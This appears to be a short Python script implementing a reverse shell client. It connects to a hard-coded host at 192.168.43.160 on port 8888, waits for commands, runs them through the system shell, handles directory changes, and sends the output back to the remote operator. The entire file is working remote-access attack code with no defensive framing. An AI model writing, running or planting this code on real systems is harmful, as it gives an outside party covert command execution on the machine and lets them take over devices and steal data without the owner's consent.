import socket
import os
import subprocess

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host="192.168.43.160"
port = 8888
s.connect((host, port))


while True:
    cmd = s.recv(5000).decode("utf-8")
    if cmd=="Initiation cmd":
        cmd="\"\""
    print("Received command:-"+cmd)

    if cmd=="connection check":
        s.send(str.encode("connection check succesfull."))
        continue

    elif cmd=="quit":
        break

    elif cmd=="\"\"":
        CWD=os.getcwd()+" > "
        s.send(str.encode(CWD))
        continue

    elif cmd[:2] == 'cd':
        CWD=os.getcwd()+" > "
        try:
            if len(cmd[3:])>0:
                os.chdir(cmd[3:])
                CWD=os.getcwd()+" > "
                s.send(str.encode(CWD))
                continue
            else:
                s.send(str.encode("No directory entered"+"\n"+CWD))
                continue
        except Exception as e:
            s.send(str.encode(str(e)+"\n"+CWD))
            continue
        
    elif len(cmd) > 0:
        p = subprocess.run(cmd[:], shell=True, capture_output=True)
        CWD = os.getcwd()+" > "
        if p.returncode==0:
            s.send(str.encode(p.stdout.decode("utf-8") + "\n"+ CWD))
        else:
            err=p.stderr.decode("utf-8")
            s.send(str.encode(err + "\n"+ CWD))

s.close()
